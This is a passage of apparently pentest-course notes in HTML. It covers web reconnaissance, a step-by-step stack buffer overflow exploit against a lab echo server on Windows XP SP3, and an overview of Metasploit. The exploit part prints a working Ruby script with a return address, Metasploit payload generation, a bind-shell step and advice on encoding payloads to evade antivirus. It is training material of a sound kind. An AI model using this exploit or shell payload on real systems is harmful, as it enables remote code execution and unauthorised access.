  <li>1way - check the response headers of the resources of the webapp in order to find some interesting values (For example X-Powered-By response headers)</li>
  <li>2 way - test if the webapp resource URLs follow a particular pattern</li>
</ul>

<h3 id="2---hidden-files">2 - Hidden Files</h3>
<ul>
  <li>Hidden files detector</li>
  <li>sometimes, web devs leave backup or config files in the webapp</li>
  <li>common hidden files that can give information are web.config.bak or php.ini.back and so on</li>
  <li>the script could read this particular file name from a list (a file For example) and create a GET request to the specific target resource to check if they are available</li>
</ul>

<h3 id="3---indexing--crawling">3 - Indexing &amp; Crawling</h3>
<ul>
  <li>develop ur own web crawler or indexing tool</li>
  <li>start from the home page of a webapp and list (and download if u are developing a crawler) all of the resources u can find in the web page.</li>
  <li>u may have to choose the page selection policy, URL restriction, the strategy to detect if a page has been already crawled etc.</li>
  <li>advanced crawlers take into account other problems such as efficiency, faults (timeouts, restricted pages, etc), bandwidth saturation and so on.</li>
</ul>

<h3 id="4---subdomain-enumeration">4 - Subdomain enumeration</h3>
<ul>
  <li>u can use some strategies already used For crawling or hidden files but u can also web search engines (such as google)</li>
</ul>

<h1 id="exploitation">Exploitation</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ELS Echo Server

The Exploit
</code></pre></div></div>

<h2 id="els-echo-server">ELS Echo Server</h2>
<ul>
  <li>its a simple echo server that sends back all the messages that it receives</li>
  <li>available at the address 172.16.5.10 port 7707. it runs xp sp3</li>
</ul>

<h3 id="the-service">the service</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span> <span class="s2">"172.16.5.10"</span><span class="p">,</span><span class="mi">7707</span>
<span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
<span class="c1"># Output: 'els echo server 1.1'</span>

<span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"hello world"</span>
<span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
<span class="c1"># Output: 'hello world - echo server'</span>
</code></pre></div></div>

<p>It responds only to the first message because it closes the connection after the response:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"a message"</span>
<span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
<span class="c1"># Output: 'a message - echo server'</span>

<span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"another message"</span>
<span class="c1"># Output: Errno::EPIPE: Broken pipe</span>
</code></pre></div></div>

<h3 id="bug-detection">Bug detection</h3>
<ul>
  <li>common attacks require bad programming</li>
  <li>in this case, the echo server has a common c++ programming bug, the size of the received data from the user is not checked causing a buffer overflow possibility</li>
</ul>

<p>Example. lets send a lot of data to the server:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span> <span class="s2">"172.16.5.10"</span><span class="p">,</span><span class="mi">7707</span>
<span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
<span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">100</span>
</code></pre></div></div>

<blockquote>
  <p>we do not receive a response, we can assume that the server is crashed</p>
</blockquote>

<ul>
  <li>the most common technique to overwrite the Return Address is by using a CALL ESP instruction address (usually located in Kernel32.dll) and then put the malicious code after the local variables space.</li>
  <li>This holds because ESP stores the top of the stack and when the RET is executed, the input_copy frame is erased and the top of the stack contains our malicious code executed next by the CALL ESP.</li>
</ul>

<p>Therefore to correctly exploit the vulnerability, we have to detect where to insert the CALL ESP address and the malicious PAYLOAD.</p>

<h3 id="the-exploit">The Exploit</h3>

<h4 id="identify-the-buffer-overflow-space">Identify the Buffer Overflow space</h4>
<p>We have to find the position of the return address</p>

<h4 id="fuzzing">Fuzzing</h4>
<ul>
  <li>its an incremental technique to detect the correct position of the return address and its mainly used when we cannot debug the vulnerable service.</li>
  <li>hackers use fuzzers only if they cannot debug the target application by themselves.</li>
</ul>

<p>If u have access to the executable, u can use tools such as:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">→</span> <span class="no">Immunity</span> <span class="no">Debugger</span> <span class="o">=</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">immunityinc</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">products</span><span class="o">/</span><span class="n">debugger</span><span class="o">/</span>
<span class="err">→</span> <span class="no">IDA</span> <span class="n">pro</span> <span class="o">=</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">hex</span><span class="o">-</span><span class="n">rays</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">products</span><span class="o">/</span><span class="n">ida</span><span class="o">/</span>
<span class="err">→</span> <span class="no">Ollydbg</span> <span class="o">=</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">ollydbg</span><span class="p">.</span><span class="nf">de</span><span class="o">/</span>
</code></pre></div></div>

<h4 id="using-a-debugger">Using a Debugger</h4>

<ul>
  <li>lets use Immunity Debugger</li>
  <li>set a breaking point on the RETN instruction of the input_copy function. cause we want to check the value of the EIP register after the return.</li>
</ul>

<p>To detect where the return address location is (offset from the vulnerable buffer), we can use two metasploit tools:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pattern_create</span><span class="p">.</span><span class="nf">rb</span>
<span class="n">pattern_offset</span><span class="p">.</span><span class="nf">rb</span>
<span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span>
</code></pre></div></div>

<p>First we create a pattern:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">pattern_create</span><span class="p">.</span><span class="nf">rb</span> <span class="o">-</span><span class="n">l</span> <span class="mi">100</span> <span class="ow">or</span> <span class="n">msf</span><span class="o">-</span><span class="n">pattern_create</span> <span class="o">-</span><span class="n">l</span> <span class="mi">100</span>
</code></pre></div></div>

<p>Then we send the string to the echo server:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span> <span class="s2">"172.16.5.10"</span><span class="p">,</span><span class="s2">"7707"</span>
<span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
<span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"&lt;the pattern_create string&gt;"</span>
</code></pre></div></div>

<blockquote>
  <p>after the crash we get the value of EIP, in this case 35624134</p>
</blockquote>

<p>Now we use the second payload with this value:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">pattern_offset</span><span class="p">.</span><span class="nf">rb</span> <span class="o">-</span><span class="n">q</span> <span class="o">&lt;</span><span class="mi">35624134</span><span class="o">&gt;</span> <span class="mi">100</span> <span class="ow">or</span> <span class="n">msf</span><span class="o">-</span><span class="n">pattern_offset</span> <span class="o">-</span><span class="n">q</span> <span class="o">&lt;</span><span class="n">query</span><span class="o">&gt;</span>
<span class="c1"># Exact match at offset 44</span>
</code></pre></div></div>

<p>This means that our script must have 44 character followed by a CALL ESP (or JMP) instruction address</p>

<h2 id="writing-the-payload">Writing the Payload</h2>

<h3 id="preamble">Preamble</h3>
<ul>
  <li>its the space between the first byte of the vulnerable buffer and the return address. we have seen that its length is 44 bytes</li>
  <li>this means that we can insert whatever we want in these bytes since they are not relevant. usually is a common convention to insert <strong>NOP</strong> operations as preamble (<strong>\x90</strong> is the HEX code For NOP)</li>
</ul>

<p>In Ruby:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">preamble</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span><span class="o">*</span><span class="mi">44</span>
</code></pre></div></div>

<h3 id="return-address">Return address</h3>
<ul>
  <li>in Windows XP SP3 we can use 0x7C868667 For a CALL ESP instruction</li>
</ul>

<p>We need to use Big-Endian, so:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">return_address</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x67\x86\x86\x7c</span><span class="s2">"</span>
</code></pre></div></div>

<h3 id="the-payload">The payload</h3>
<ul>
  <li>before adding the real malicious payload logic, remember that after the return address, there is space allocated For the arguments passed to call the function.</li>
</ul>

<p>Does not need to be the exact size, just insert enough NOPs before the real malicious payload:</p>

<table>
  <tbody>
    <tr>
      <td>nop,nop,nop</td>
      <td> </td>
    </tr>
    <tr>
      <td>nop</td>
      <td> </td>
    </tr>
    <tr>
      <td>CALL ESP address</td>
      <td>-&gt; EIP register</td>
    </tr>
    <tr>
      <td>nop</td>
      <td> </td>
    </tr>
    <tr>
      <td>nop</td>
      <td> </td>
    </tr>
    <tr>
      <td>malicious payload</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>→ arguments_nop = “\x90”*10</p>

<ul>
  <li>metasploit helps us with two tools: <strong>msfpayload</strong> and <strong>msfencode</strong></li>
  <li>the first one can be used to generate the payload</li>
  <li>
    <p>the second can be used to encode the payload in order to avoid bad characters</p>
  </li>
  <li>Since the vulnerability is caused by a strcpy in a C++ application, we must avoid the <strong>\x00</strong> character (end of line); this is because strcpy will stop the copy if it encounters these bytes</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msfpayload</span> <span class="n">windows</span><span class="o">/</span><span class="nb">exec</span> <span class="no">CMD</span><span class="o">=</span><span class="n">calc</span><span class="p">.</span><span class="nf">exe</span> <span class="no">R</span> <span class="o">|</span> <span class="n">msfencode</span> <span class="o">-</span><span class="n">b</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">-</span><span class="n">t</span> <span class="n">rb</span>
<span class="c1"># buf = "&lt;the generate payload&gt;"</span>
</code></pre></div></div>

<p>So, we copy the payload to our ruby script:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">calc_payload</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">the</span> <span class="n">generate</span> <span class="n">payload</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Then we concatenate all parts previously generated:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exploit</span> <span class="o">=</span> <span class="n">preamble</span> <span class="o">+</span> <span class="n">return_address</span> <span class="o">+</span> <span class="n">arguments_nop</span> <span class="o">+</span> <span class="n">calc_payload</span>
</code></pre></div></div>

<h3 id="exploitation-1">Exploitation</h3>
<ul>
  <li>we can add a simple TCP connection to send the payload</li>
</ul>

<p>Our full script:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">preamble</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span><span class="o">*</span><span class="mi">44</span>
<span class="n">return_address</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x67\x86\x86\x7c</span><span class="s2">"</span>
<span class="n">arguments_nop</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span><span class="o">*</span><span class="mi">10</span>
<span class="n">calc_payload</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">the</span> <span class="n">generate</span> <span class="n">payload</span><span class="o">&gt;</span>
<span class="n">exploit</span> <span class="o">=</span> <span class="n">preamble</span> <span class="o">+</span> <span class="n">return_address</span> <span class="o">+</span> <span class="n">arguments_nop</span> <span class="o">+</span> <span class="n">calc_payload</span>

<span class="n">host</span><span class="p">,</span><span class="n">port</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="nb">require</span> <span class="s1">'socket'</span>
<span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">s</span><span class="o">|</span> <span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="n">exploit</span><span class="p">}</span>
</code></pre></div></div>

<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">echo_payload</span><span class="p">.</span><span class="nf">rb</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">5.10</span> <span class="mi">7707</span>
</code></pre></div></div>

<blockquote>
  <p>On the server machine, a calculator has been executed. The exploit works.</p>
</blockquote>

<h3 id="shell-on-the-victim">Shell on the victim</h3>
<p>Instead of open a calculator, we can open a bind or reverse connection</p>

<p>With metasploit:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">windows</span><span class="o">/</span><span class="n">shell_bind_tcp</span>
</code></pre></div></div>

<ul>
  <li>go to the msfconsole</li>
  <li>and see the options we can set</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msfpayload</span> <span class="n">windows</span><span class="o">/</span><span class="n">shell_bind_tcp</span> <span class="no">LPORT</span><span class="o">=</span><span class="mi">1117</span> <span class="no">R</span> <span class="o">|</span> <span class="n">msfencode</span> <span class="o">-</span><span class="n">b</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">-</span><span class="n">t</span> <span class="n">rb</span>
<span class="c1"># &lt;output of payload&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>we can use the same structure of the calc exploitation
we just have to change the malicious payload</p>
</blockquote>

<ul>
  <li>after sending the payload</li>
  <li>we must open a telnet in that port</li>
</ul>

<p>In kali:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">telnet</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">5.10</span> <span class="mi">1117</span>
<span class="c1"># we have a shell</span>
</code></pre></div></div>

<h1 id="metasploit">Metasploit</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Introduction

ELS Echo Server

Architecture and Framework

Explore and write the ELS Echo module

Meterpreter scripting
</code></pre></div></div>

<h2 id="introduction">Introduction</h2>
<p>Metasploit is a pentest framework designed to quickly use and develop exploits, payloads, encoders and much more.</p>

<p>→ http://www.metasploit.com/</p>

<h2 id="els-echo-server-1">ELS Echo Server</h2>
<ul>
  <li>in the example our target is a win xp sp3 machine</li>
  <li>ip: 172.16.5.10 port:7707</li>
</ul>

<h3 id="the-service-1">The service</h3>
<p>It just echos the messages:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span> <span class="s2">"172.16.5.10"</span><span class="p">,</span><span class="s2">"7707"</span>
<span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
<span class="c1"># Output: gets banner</span>
<span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"hello world"</span>
<span class="n">s</span><span class="p">.</span><span class="nf">gets</span>
<span class="c1"># Output: "hello world"</span>
</code></pre></div></div>

<h3 id="the-vulnerability">The vulnerability</h3>
<p>If we send to many characters the service will crash:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">100</span>
<span class="c1"># crashes</span>
</code></pre></div></div>

<blockquote>
  <p>Now we want to automate the exploitation phase. This avoids having to write a custom script (or a payload) each time we find an ELS Echo Server.</p>
</blockquote>

<h3 id="exploitation-with-metasploit">Exploitation with Metasploit</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">→</span> <span class="n">run</span> <span class="n">msfconsole</span>
 <span class="err">→</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">els</span><span class="o">/</span><span class="n">echoserv</span>
 <span class="err">→</span> <span class="n">info</span>
 <span class="err">→</span> <span class="n">check</span> <span class="sr">//</span> <span class="n">we</span> <span class="n">can</span> <span class="n">use</span> <span class="n">this</span> <span class="n">command</span><span class="p">,</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">the</span> <span class="n">target</span> <span class="n">is</span> <span class="n">exploitable</span>
 <span class="err">→</span> <span class="n">set</span> <span class="no">PAYLOAD</span> <span class="o">&lt;</span> <span class="n">preferred</span> <span class="n">payload</span> <span class="o">&gt;</span>
 <span class="err">→</span> <span class="n">set</span> <span class="n">lhost</span> <span class="ow">and</span> <span class="n">lport</span>
 <span class="err">→</span> <span class="n">exploit</span>
 <span class="c1"># to get a meterpreter session</span>
</code></pre></div></div>

<h2 id="architecture-and-framework">Architecture and Framework</h2>

<p>→ https://github.com/rapid7/metasploit-framework/wiki#metasploit-development</p>

<p>Metasploit framework Architecture</p>

<table>
  <tbody>
    <tr>
      <td> </td>
      <td>libraries</td>
      <td>interfaces</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>tools &gt;</td>
      <td>Rex</td>
      <td>Console</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td> </td>
      <td>MSF CORE</td>
      <td>CLI</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>plugins &gt;</td>
      <td>MSF BASE</td>
      <td>&lt; WEB</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>modules</td>
      <td> </td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>payloads</td>
      <td>exploits</td>
      <td>encoders</td>
      <td>post-modules</td>
      <td>auxiliary</td>
    </tr>
  </tbody>
</table>

<p>Path in kali:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span>
</code></pre></div></div>

<p>Path useful For local user modules and plugins:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">~</span><span class="sr">/.msf4
</span></code></pre></div></div>

<h2 id="interfaces">Interfaces</h2>

<h3 id="msfconsole">Msfconsole</h3>
<ul>
  <li>The most used one. its a complex interface and a shell command too.</li>
  <li>with the <strong>msfconsole -h</strong> option we can see usage information</li>
</ul>

<h3 id="msfcli">Msfcli</h3>
<ul>
  <li>its the command-line interface into the metasploit framework.</li>
  <li>u can use to launch exploits or handler quickly</li>
  <li>its the best choice if u already know what u have to do and u do not want to use the msfconsole</li>
  <li>using <strong>msfcli -h</strong> option we can see usage information</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msfcli</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">els</span><span class="o">/</span><span class="n">echoserv</span> <span class="no">RHOST</span><span class="o">=</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">5.10</span> <span class="no">E</span>
<span class="sr">//</span> <span class="no">E</span> <span class="o">=</span> <span class="n">execute</span> 
<span class="sr">//</span> <span class="n">rport</span><span class="p">,</span><span class="n">target</span> <span class="ow">and</span> <span class="n">payloads</span> <span class="n">options</span> <span class="n">are</span> <span class="n">taken</span> <span class="n">as</span> <span class="n">default</span>
</code></pre></div></div>

<h3 id="web-interface">Web interface</h3>
<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">→</span> <span class="n">service</span> <span class="n">metasploit</span> <span class="n">start</span>
 <span class="err">→</span> <span class="n">its</span> <span class="k">in</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">3790</span>
 <span class="err">→</span> <span class="n">to</span> <span class="n">use</span> <span class="n">it</span><span class="p">,</span> <span class="n">a</span> <span class="n">registration</span> <span class="n">is</span> <span class="n">required</span> <span class="n">but</span> <span class="n">its</span> <span class="n">free</span> <span class="ow">and</span> <span class="n">quick</span>
</code></pre></div></div>

<ul>
  <li>u can build your own projects and perform the same things u can do with msfconsole</li>
</ul>

<p>Usage example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">search</span> <span class="n">modules</span> <span class="o">&gt;</span> <span class="n">echoserv</span>
</code></pre></div></div>

<ul>
  <li>now we can set the options through the interface</li>
  <li>after running, we get a meterpreter session in the <strong>sessions tab</strong></li>
</ul>

<p>We have various features to interact with the session:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="sr">//</span> <span class="n">collect</span> <span class="nb">system</span> <span class="n">data</span><span class="p">,</span> <span class="n">virtual</span> <span class="n">desktop</span><span class="p">,</span> <span class="n">access</span> <span class="n">filesystem</span><span class="p">,</span> <span class="n">search</span> <span class="n">filesystem</span><span class="p">,</span> <span class="n">command</span> <span class="n">shell</span><span class="p">,</span> <span class="n">create</span> <span class="n">proxy</span> <span class="n">pivot</span><span class="p">,</span> <span class="n">create</span> <span class="no">VPN</span> <span class="n">pivot</span><span class="p">,</span> <span class="n">terminate</span> <span class="n">session</span>
</code></pre></div></div>

<ul>
  <li>it may be useful if u have to automate a lot of tasks</li>
  <li>however some features are not available in the free community version (like auto-exploitation)</li>
</ul>

<h3 id="others-1">Others</h3>
<p>→ /usr/share/metasploit-framework &gt; ls</p>

<ul>
  <li>then check the options with <strong>-h</strong> to list more information</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msfvenom</span> <span class="o">-</span><span class="n">h</span>
</code></pre></div></div>

<h2 id="libraries-1">Libraries</h2>
<p>→ /usr/share/metasploit-framework/lib &gt; ls</p>

<p>→ moreover the libraries: https://github.com/rapid7/metasploit-framework/blob/master/documentation/developers_guide.pdf</p>

<ul>
  <li>u can explore its modules, classes, utilities etc to use its libraries in your scripts without using any Metasploit interface</li>
  <li>
    <p>https://github.com/rapid7/metasploit-framework/wiki#metasploit-development</p>
  </li>
  <li>Metasploit provides very good API documentation that shows u the code of each method u want to know</li>
</ul>

<p>→ https://rapid7.github.io/metasploit-framework/api/</p>

<h3 id="rex-library">Rex library</h3>
<ul>
  <li>Ruby extension library is the most important of the entire framework</li>
  <li>it provides a collection of basic classes and modules useful For almost all of the framework tasks: protocols, sockets, services, encoders, text transformations and so on.</li>
</ul>

<p>→ /usr/share/metasploit-framework/lib/rex/ &gt; ls</p>

<blockquote>
  <p>moreover, u can see that the API documentation may help u to understand all of the features of Rex: http://rapid7.github.io/metasploit-framework/api/</p>
</blockquote>

<h3 id="core-library">Core library</h3>
<p>It implements the set of classes and utilities that can be used as an interface to the framework modules and plugins</p>

<p>→ /usr/share/metasploit-framework/lib/msf/core &gt; ls</p>

<ul>
  <li>
    <p>can be used with an instance based approach</p>
  </li>
  <li>The instance contains the entire framework state and u can create it using the <strong>Msf::Framework.new</strong></li>
  <li>the core instance can manage modules, plugins, sessions, jobs and so on</li>
  <li>
    <p>it uses features of the Rex library</p>
  </li>
  <li>u can also use the API documentation (<strong>Msf</strong> node in this case)</li>
  <li>it also contains classes defined in the Base library</li>
</ul>

<h3 id="base-library">Base library</h3>
<ul>
  <li>its developed on top of the Core library and it makes easier to interact with the framework structure. its purpose is to provide simplified and more user-friendly APIs to improve and speed up the development</li>
  <li>/usr/share/metasploit-framework/lib/msf/base &gt; ls</li>
</ul>

<h2 id="modules-1">Modules</h2>
<ul>
  <li>the part that users uses to perform exploitations and penetration testing activities</li>
  <li>if a new payload module is developed, all of the exploits can automatically use it thanks to the framework structure.</li>
</ul>

<p>→ /usr/share/metasploit-framework/modules</p>

<p>Modules:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="n">payloads</span>
<span class="o">-</span> <span class="n">exploits</span>
<span class="o">-</span> <span class="n">encoders</span>
<span class="o">-</span> <span class="n">post</span><span class="o">-</span><span class="n">modules</span>
<span class="o">-</span> <span class="n">auxiliary</span>
</code></pre></div></div>

<h3 id="exploits">exploits</h3>
<p>→ /usr/share/metasploit-framework/modules/exploits</p>

<ul>
  <li>handlers are exploits modules too.</li>
</ul>

<p>For example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
</code></pre></div></div>

<blockquote>
  <p>reverse connections can be used to bypass NAT rules since it is the victim that starts the handshake</p>
</blockquote>

<h3 id="auxiliary">auxiliary</h3>
<ul>
  <li>are used to perform operations different from exploitation. they are generally used when there is no need of a payload or a target.</li>
  <li>like Denial of Services (DOS) attacks while some other are used as scanners, information collections and so on.</li>
</ul>

<h3 id="payloads">payloads</h3>
<ul>
  <li>u will always use a payload module when u launch an exploit (remember that u usually do a <strong>SET PAYLOAD</strong> command)</li>
  <li>they encapsulate the real malicious code that is going to be executed if the exploitation succeeds (the raw instructions that make it possible to take control of the target machine exploited)</li>
</ul>

<p>→ /usr/share/metasploit-framework/modules/payloads</p>

<p>Types:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">→</span> <span class="n">single</span>
 <span class="err">→</span> <span class="n">stagers</span>
 <span class="err">→</span> <span class="n">stages</span>
</code></pre></div></div>

<ul>
  <li>single: (<em>me</em>) has all of the raw code to perform a particular task. example: bind_shell is a single payload because it does not require additional code.</li>
  <li>a meterpreter connection requires a stager and a staged payload</li>
  <li>stager: is used to setup the connection between the target and the attacker machine</li>
  <li>then, a staged payload is sent to the target victim and its the real malicious raw code.</li>
</ul>

<h3 id="nops-and-encoders">Nops and Encoders</h3>
<ul>
  <li>are modules related to the exploitation phase</li>
  <li>nops modules are used to generate instructions that have no effect to the target machine. A typical nop instruction is <strong>\x90</strong></li>
  <li>some nops are detected by AV, therefore metasploit provides some nops generator modules that u can use to generate more sophisticated ones.</li>
</ul>

<p>Encoders are another type of module used to improve your payload generation in order to make them undetectable from AVs:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">encoders</span>
<span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">nops</span>
</code></pre></div></div>

<h3 id="post-1">Post</h3>
<ul>
  <li>used to perform post exploitation tasks and theregore they may be require an active meterpreter session to interact with as an option.</li>
</ul>

<p>We can use with <strong>run</strong> command:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">run</span> <span class="n">post</span><span class="o">/*</span>
<span class="o">-</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">post</span>
</code></pre></div></div>

<h3 id="plugin">Plugin</h3>
<ul>
  <li>used to extend framework capabilities</li>
  <li>often they are developed to provide a bridge between the metasploit framework and other pentesting tools</li>
</ul>

<p>→ /usr/share/metasploit-framework/plugins</p>

<p>Some plugin are related to other pentest tools, such as:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="n">openvas</span>
<span class="o">-</span> <span class="n">nessus</span>
<span class="o">-</span> <span class="n">nexpose</span>
</code></pre></div></div>

<h3 id="tools">Tools</h3>
<ul>
  <li>are particular scripts that mainly use the Ruby Extension library (Rex) to perform some tasks that do not require any framework interaction or structure.</li>
  <li>if u want to use some Rex classes or features, u r writing what is called a metasploit dependent tool and u have to include it the Rex library.</li>
</ul>

<p>→ /usr/share/metasploit-framework/tools</p>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pattern_create</span><span class="p">.</span><span class="nf">rb</span>
<span class="n">pattern_offset</span><span class="p">.</span><span class="nf">rb</span>
</code></pre></div></div>

<h2 id="write-a-module">Write a Module</h2>

<h3 id="module-type-and-location">Module type and location</h3>
<ul>
  <li>first thing &gt; identify the module type</li>
</ul>

<p>In this case, the module that we are going to develop is an <strong>exploitation</strong> module (since we want to exploit a buffer overflow vulnerability of the els echo server)</p>

<ul>
  <li>we know that it targets apps running on Windows</li>
  <li>these infos are important cause it tells us where the real Ruby file module must be stored in order to make it recognizable by the framework</li>
</ul>

<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">els</span><span class="o">/</span><span class="n">echoserv</span>
</code></pre></div></div>

<p>We can put the module in two places:</p>
